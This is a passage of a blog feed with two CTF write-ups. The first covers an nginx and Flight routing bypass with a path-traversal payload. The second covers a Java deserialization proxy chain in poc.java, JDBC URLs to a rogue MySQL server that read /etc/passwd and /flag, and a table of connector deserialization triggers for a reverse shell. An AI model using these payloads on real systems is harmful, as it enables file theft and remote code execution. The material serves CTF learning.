&lt;p&gt;给了docker-compose文件&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
    <category term="other" scheme="https://123-prog.github.io/categories/CTF/other/"/>
    
    
    <category term="caddy+php-fpm目录穿越" scheme="https://123-prog.github.io/tags/caddy-php-fpm%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
    
    <category term="利用pear扩展库写马" scheme="https://123-prog.github.io/tags/%E5%88%A9%E7%94%A8pear%E6%89%A9%E5%B1%95%E5%BA%93%E5%86%99%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>(RCTF2021) Easyphp</title>
    <link href="https://123-prog.github.io/2021/09/16/RCTF2021-Easyphp/"/>
    <id>https://123-prog.github.io/2021/09/16/RCTF2021-Easyphp/</id>
    <published>2021-09-16T14:04:12.000Z</published>
    <updated>2021-09-22T10:21:21.134Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h3><p>给了源码和nginx配置文件，主要是配置文件，看一下</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    listen  [::]:80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #access_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;host.access.log  main;</span><br><span class="line">    root   &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">    location &#x2F;admin &#123;</span><br><span class="line">        allow 127.0.0.1;</span><br><span class="line">        deny all;</span><br><span class="line">    &#125;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        index  index.php;</span><br><span class="line">        try_files $uri @phpfpm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #error_page  404              &#x2F;404.html;</span><br><span class="line"></span><br><span class="line">    # redirect server error pages to the static page &#x2F;50x.html</span><br><span class="line">    #</span><br><span class="line">    error_page   500 502 503 504  &#x2F;50x.html;</span><br><span class="line">    location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    proxy_pass   http:&#x2F;&#x2F;127.0.0.1;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">    #</span><br><span class="line">    location @phpfpm &#123;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">        fastcgi_split_path_info ^(.+?\.php)(&#x2F;.*)$;</span><br><span class="line">        fastcgi_pass   php:9000;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  $document_root&#x2F;index.php;</span><br><span class="line">        fastcgi_param  REQUEST_URI  $uri;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # deny access to .htaccess files, if Apache&#39;s document root</span><br><span class="line">    # concurs with nginx&#39;s one</span><br><span class="line">    #</span><br><span class="line">    #location ~ &#x2F;\.ht &#123;</span><br><span class="line">    #    deny  all;</span><br><span class="line">    #&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意几个关键点：</p><blockquote><p>匹配路径<code>/admin</code>会被waf掉，只允许本地访问</p><p>传递给fastcgi的参数，<code>SCRIPT_FILENAME</code>写死的，为index.php，就是说，我们访问的任何路径，fastcgi解析的永远都是index.php，index.php中有各种路由负责实现各种功能</p><p><code>REQUEST_URI</code> 设为 $uri，$uri为nginx配置的内置参数，为访问路径，不包含query部分，比如路径<code>http://example.com/test/doc?a=1</code>的$uri就是<code>/test/doc</code>，而且这个参数也会对应php代码中的<code>$_SERVER[&#39;REQUEST_URI&#39;]</code></p></blockquote><h3 id="0x02-审计"><a href="#0x02-审计" class="headerlink" title="0x02 审计"></a>0x02 审计</h3><h4 id="request-gt-url："><a href="#request-gt-url：" class="headerlink" title="$request-&gt;url："></a>$request-&gt;url：</h4><p>目标是访问到<code>/admin</code>，路由下有任意文件读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$app</span>-&gt;route(<span class="string">&#x27;/admin&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$app</span>;</span><br><span class="line">    <span class="variable">$request</span> = <span class="variable">$app</span>-&gt;request();</span><br><span class="line">    <span class="variable">$app</span>-&gt;render(<span class="string">&quot;admin&quot;</span>,[<span class="string">&quot;data&quot;</span>=&gt;<span class="string">&quot;./&quot;</span>.<span class="variable">$request</span>-&gt;query-&gt;data],<span class="string">&quot;body_content&quot;</span>);</span><br><span class="line">    <span class="variable">$app</span>-&gt;render(<span class="string">&quot;template&quot;</span>,[]);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>但有很多限制，首先第一个就是nginx配置中的限制，如果我们直接访问<code>/admin</code>，会直接报403</p><p>这里就有一个思路，flight的路由解析如果有漏洞的话，是否可以访问某个不是<code>/admin</code>开头的路径，却可以被解析到<code>/admin</code>的路径，这样的话nginx的限制就可以解除了</p><p>还有一个限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$app</span>-&gt;route(<span class="string">&#x27;/*&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$app</span>;</span><br><span class="line">    <span class="variable">$request</span> = <span class="variable">$app</span>-&gt;request();</span><br><span class="line">    <span class="variable">$app</span>-&gt;render(<span class="string">&quot;head&quot;</span>,[],<span class="string">&quot;head_content&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$request</span>-&gt;url,<span class="string">&quot;login&quot;</span>)!==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>])&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$app</span>-&gt;redirect(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这是一个过滤，验证你是否登陆过，但注意到这个if判断，只要<code>$request-&gt;url</code>之中包含<code>login</code>，也就可以绕过</p><p>阅读源码，<code>$request-&gt;url</code>来自<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>，初始化的时候会进一步处理，处理为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;base != <span class="string">&#x27;/&#x27;</span> &amp;&amp; strlen(<span class="keyword">$this</span>-&gt;base) &gt; <span class="number">0</span> &amp;&amp; strpos(<span class="keyword">$this</span>-&gt;url, <span class="keyword">$this</span>-&gt;base) === <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;url = substr(<span class="keyword">$this</span>-&gt;url, strlen(<span class="keyword">$this</span>-&gt;base));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，如果访问路径为<code>/a/aa/aaa</code>，经过处理，这里直接截取了<code>base</code>，就会变成<code>/aaa</code>，即对应<code>$request-&gt;url</code>为<code>/aaa</code>，可以在本地环境中得到验证</p><h4 id="route："><a href="#route：" class="headerlink" title="route："></a>route：</h4><p>下面审计以下flight的路由匹配规则</p><p>路由函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">route</span>(<span class="params">Request <span class="variable">$request</span></span>) </span>&#123;</span><br><span class="line">     <span class="variable">$url_decoded</span> = urldecode( <span class="variable">$request</span>-&gt;url );</span><br><span class="line">     <span class="keyword">while</span> (<span class="variable">$route</span> = <span class="keyword">$this</span>-&gt;current()) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$route</span> !== <span class="literal">false</span> &amp;&amp; <span class="variable">$route</span>-&gt;matchMethod(<span class="variable">$request</span>-&gt;method) &amp;&amp; <span class="variable">$route</span>-&gt;matchUrl(<span class="variable">$url_decoded</span>, <span class="keyword">$this</span>-&gt;case_sensitive)) &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="variable">$route</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;next();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>首先会对<code>$request-&gt;url</code>进行一次url解码，匹配url的函数为<code>matchUrl</code>，跟进这个函数</p><p>发现匹配规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;#^&#x27;</span>.<span class="variable">$regex</span>.<span class="string">&#x27;(?:\?.*)?$#&#x27;</span>.((<span class="variable">$case_sensitive</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27;i&#x27;</span>), <span class="variable">$url</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$ids</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;params[<span class="variable">$k</span>] = (array_key_exists(<span class="variable">$k</span>, <span class="variable">$matches</span>)) ? urldecode(<span class="variable">$matches</span>[<span class="variable">$k</span>]) : <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;regex = <span class="variable">$regex</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>这里传入的参数为$url，这个参数是一次url解码之后的<code>$request-&gt;url</code>，匹配的话，只要这个以<code>/admin</code>开头，就匹配成功，就会调用对应的回调函数</p><p>重点来了，<code>$request-&gt;url</code>在前面分析过，在初始化的时候会经过一个截取，那么如果我们访问<code>/aaa/admin</code>，<code>$request-&gt;url</code>对应的是<code>/admin</code>，flight的路由会调用<code>/admin</code>对应的回调函数，而且<code>/aaa/admin</code>这个路径也不会匹配nginx配置的waf，成功绕过第一个限制</p><p>现在我们访问<code>/aaa/admin</code>就可以到admin路由下了，但是因为没有登录，会跳转到login处</p><h4 id="login："><a href="#login：" class="headerlink" title="login："></a>login：</h4><p>前面也分析了，只要<code>$request-&gt;url</code>包含<code>login</code>第二个问题也解决了</p><p><strong>路由拿到<code>$request-&gt;url</code>参数后的正则匹配是允许后面带有<code>query</code></strong></p><p>虽然我们由于nginx的配置导致<code>$request-&gt;url</code>不会包含query，但如果我们传入路径<code>/aaa/admin%3flogin=1</code>，由于是url编码，服务器解析路径的时候把这一整个都当作路径，而不会认为后面login是参数，所以此时的<code>$request-&gt;url</code>为<code>/admin?login=1</code>，路由匹配可以通过，也达到了<code>$request-&gt;url</code>包含<code>login</code>绕过登录的要求</p><p>所以最后的payload为</p><p><code>/aaa/admin%3flogin=1&amp;data=..%252F..%252F..%252F..%252F..%252Fflag</code></p><p>注意data参数中包含的<code>/</code>需要经过两次url编码，否则，<code>$request-&gt;url</code>截取后会变成<code>/flag</code>，主要是保证/admin后没有/</p><p><img src="/2021/09/16/RCTF2021-Easyphp/Snipaste_2021-09-16_23-03-11.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-题目&quot;&gt;&lt;a href=&quot;#0x01-题目&quot; class=&quot;headerlink&quot; title=&quot;0x01 题目&quot;&gt;&lt;/a&gt;0x01 题目&lt;/h3&gt;&lt;p&gt;给了源码和nginx配置文件，主要是配置文件，看一下&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
    <category term="php代码审计" scheme="https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="nginx路径解析绕过" scheme="https://123-prog.github.io/tags/nginx%E8%B7%AF%E5%BE%84%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87/"/>
    
    <category term="flight框架代码审计" scheme="https://123-prog.github.io/tags/flight%E6%A1%86%E6%9E%B6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>(羊城杯 2020)A Piece Of Java</title>
    <link href="https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/"/>
    <id>https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/</id>
    <published>2021-09-06T15:26:05.000Z</published>
    <updated>2021-09-22T10:20:49.735Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-源码审计"><a href="#0x01-源码审计" class="headerlink" title="0x01 源码审计"></a>0x01 源码审计</h3><p>主控制器下的路由<code>/hello</code>，存在从外界输入获取序列化数据并进行反序列化的操作</p><a id="more"></a><p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_15-21-54.png"></p><p>看一下<code>deserialize()</code></p><p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_15-22-18.png"></p><p>这里的配置文件<code>serialkiller.conf</code>里面设置了白名单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;whitelist&gt;</span><br><span class="line">    &lt;regexp&gt;gdufs\..*&lt;&#x2F;regexp&gt;</span><br><span class="line">    &lt;regexp&gt;java\.lang\..*&lt;&#x2F;regexp&gt;</span><br><span class="line">&lt;&#x2F;whitelist&gt;</span><br></pre></td></tr></table></figure><p>序列化只会序列化白名单里的类，这样限制了我们的漏洞利用</p><p>注意到<code>/hello</code>路由反序列化了<code>Info</code>类，而且存在一个动态代理</p><p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_16-12-14.png"></p><p><code>Info</code>是一个接口类，<code>DatabaseInfo</code>和<code>UserInfo</code>实现这个接口，是两个委托类，看一下动态代理类覆写的<code>invoke</code>方法</p><p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_16-15-37.png"></p><p>判断方法名是否为<code>getAllInfo</code>，并且会执行<code>checkAllInfo()</code>，刚好在<code>DatabaseInfo</code>类中的<code>checkAllInfo()</code>存在连接数据库的行为，参数还全都可控</p><p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_16-19-31.png"></p><p>那么我们可以构造poc，构造一个动态代理类实例，<strong>代理<code>DatabaseInfo</code>的操作</strong>，对其序列化，作为反序列化的数据</p><p><code>/hello</code>路由拿到数据反序列化之后，会调用<code>getAllInfo()</code>方法，因为动态代理的原因，会调用代理中的<code>invoke</code>方法，间接地调用了<code>checkAllInfo()</code>方法连接数据库，而且<code>jdbc</code>的<code>url</code>用的字符串拼接，完全可控</p><p><code>poc.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.DatabaseInfo;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        DatabaseInfo dataInfo = <span class="keyword">new</span> DatabaseInfo();  <span class="comment">//实例一个DatabaseInfo类</span></span><br><span class="line"></span><br><span class="line">        dataInfo.setHost(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        dataInfo.setPort(<span class="string">&quot;3306&quot;</span>);</span><br><span class="line"><span class="comment">//设置为远程主机的ip:port</span></span><br><span class="line">        dataInfo.setUsername(<span class="string">&quot;fileread_/flag_AQUA&quot;</span>);</span><br><span class="line">        dataInfo.setPassword(<span class="string">&quot;123&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&quot;</span>);</span><br><span class="line">        <span class="comment">//通过Username和Password控制jdbc的url</span></span><br><span class="line">    </span><br><span class="line">        ClassLoader classLoader = dataInfo.getClass().getClassLoader();</span><br><span class="line">        Class[] interfaces = dataInfo.getClass().getInterfaces();</span><br><span class="line">        InfoInvocationHandler infoInvocationHandler = <span class="keyword">new</span> InfoInvocationHandler(dataInfo);</span><br><span class="line">        Info proxy = (Info) Proxy.newProxyInstance(classLoader, interfaces, infoInvocationHandler);</span><br><span class="line"><span class="comment">//新建动态代理实例，需要获取委托类的ClassLoader和接口数组，将DatabaseInfo的实例作为参数传入</span></span><br><span class="line">        <span class="comment">//InfoInvocationHandler构造函数获取代理实例，最后拿到proxy，通过代理调用委托类的方法，会调用代</span></span><br><span class="line">        <span class="comment">//理类覆写的invoke方法作为代替</span></span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        objectOutputStream.writeObject(proxy);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(baos.toByteArray())));</span><br><span class="line">        <span class="comment">//序列化数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到base64串作为cookie的data值，即可实现对任意mysql服务端的连接</p><h2 id="0x02-解法一：mysql恶意服务端读取文件"><a href="#0x02-解法一：mysql恶意服务端读取文件" class="headerlink" title="0x02 解法一：mysql恶意服务端读取文件"></a>0x02 解法一：mysql恶意服务端读取文件</h2><p>利用工具在vps上构造恶意mysql服务端</p><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>构造恶意mysql服务端，令连接客户端发送其本地文件内容到服务端，实现任意读取文件</p><p>例如，这里直接写jdbc的url作为例子</p><p><code>jdbc:mysql://127.0.0.1:3306/jdbc?user=fileread_/etc/passwd&amp;password=xxx&amp;allowLoadLocalInfile=true</code></p><p><code>jdbc:mysql://127.0.0.1:3306/jdbc?user=fileread_file:///&amp;password=xxx&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true</code></p><blockquote><p><code>allowLoadLocalInfile</code>为mysql jdbc的配置选项，允许mysql使用<code>LOAD DATA LOCAL INFILE ...</code>读取文件，否则可能读取不到文件内容</p><p><code>allowUrlInLocalInfile</code>也是配置项，顾名思义，打开的话，允许在<code>LOAD DATA LOCAL INFILE ...</code>解析urls，各种协议都可以尝试，可以使用http实现SSRF，或者file协议读取文件，目录结构，如上例子2</p></blockquote><p>所以解法一就是利用恶意服务端读取根目录结构，发现flag文件直接读</p><p>构造jdbc url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;jdbc?user&#x3D;fileread_file:&#x2F;&#x2F;&#x2F;&amp;password&#x3D;xxx&amp;allowLoadLocalInfile&#x3D;true&amp;allowUrlInLocalInfile&#x3D;true&#96;</span><br></pre></td></tr></table></figure><p>读取根目录结构</p><p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_17-28-21.png"></p><p>发现flag文件，更改jdbc url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;jdbc?user&#x3D;fileread_&#x2F;flag_AQUA&amp;password&#x3D;xxx&amp;allowLoadLocalInfile&#x3D;true</span><br></pre></td></tr></table></figure><p>读取flag</p><p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_17-30-57.png"></p><h3 id="0x02-解法二：mysql恶意服务端-java反序列化"><a href="#0x02-解法二：mysql恶意服务端-java反序列化" class="headerlink" title="0x02 解法二：mysql恶意服务端+java反序列化"></a>0x02 解法二：mysql恶意服务端+java反序列化</h3><p>mysql恶意服务端不仅仅可以读取客户端文件，还可以让客户端对服务端数据进行反序列化触发java反序列化漏洞</p><p>mysql-connector的版本不一样，触发反序列化的点就不一样，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ServerStatusDiffInterceptor触发</span><br><span class="line">8.x: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">6.x(属性名不同): jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">5.1.11及以上的5.x版本（包名没有了cj）: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">5.1.10及以下的5.1.X版本： 同上，但是需要连接后执行查询。</span><br><span class="line"></span><br><span class="line">5.0.x: 还没有ServerStatusDiffInterceptor这个东西┓( ´∀&#96; )┏</span><br><span class="line"></span><br><span class="line">detectCustomCollations触发：</span><br><span class="line">5.1.41及以上: 不可用</span><br><span class="line"></span><br><span class="line">5.1.29-5.1.40: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">5.1.28-5.1.19： jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">5.1.18以下的5.1.x版本： 不可用</span><br><span class="line"></span><br><span class="line">5.0.x版本不可用</span><br></pre></td></tr></table></figure><p>看一下依赖，是<code>8.0.19</code>版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;8.0.19&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><p>所以触发反序列化的payload应该像下面一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</span><br></pre></td></tr></table></figure><p>同样使用上面的恶意Mysql服务端</p><p>构造用户名为<code>yso_CommonsCollections5_command</code>，command换成弹shell的命令就可以，这里用到了ysoserial中的cc5链，因为在依赖中serialkiller为3.0版本，查看对应依赖，可以发现Commons-Collections 3.2.1的依赖，对应利用链cc5，ysoserial下载地址<a href="https://github.com/angelwhu/ysoserial%EF%BC%8C%E5%9C%A8%E6%81%B6%E6%84%8Fmysql%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%60config.json%60%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AEysoserial%E8%B7%AF%E5%BE%84">https://github.com/angelwhu/ysoserial，在恶意mysql目录下的`config.json`文件配置ysoserial路径</a></p><p><code>poc.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 